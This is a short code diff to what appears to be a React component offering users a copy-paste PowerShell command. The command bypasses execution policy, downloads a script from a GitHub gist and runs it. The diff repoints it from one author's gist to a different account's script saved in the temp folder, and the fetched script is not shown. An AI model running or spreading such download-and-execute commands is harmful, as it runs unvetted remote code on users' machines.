@@ -9,7 +9,7 @@ import { useLanguage } from "@/hooks/use-language";
  * reviewed on the linked gist before running it.
  */
 export const COPY_SCRIPT =
-  "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex \"&{$((New-Object System.Net.WebClient).DownloadString('https://gist.github.com/MadeBaruna/1d75c1d37d19eca71591ec8a31178235/raw/getlink.ps1'))} global\"";
+  "Set-ExecutionPolicy Bypass -Scope Process -Force; [Net.ServicePointManager]::SecurityProtocol=([Net.ServicePointManager]::SecurityProtocol -bor 3072); $u='https://gist.githubusercontent.com/Pantantey/18c3abfc51fe97f14552474aef4efbee/raw/historyImporter.ps1'; $t=$env:TEMP+'\\gwt-imp.ps1'; Invoke-WebRequest -Uri $u -UseBasicParsing -OutFile $t; & $t";
 
 export function CopyScriptButton() {
   const { t } = useLanguage();
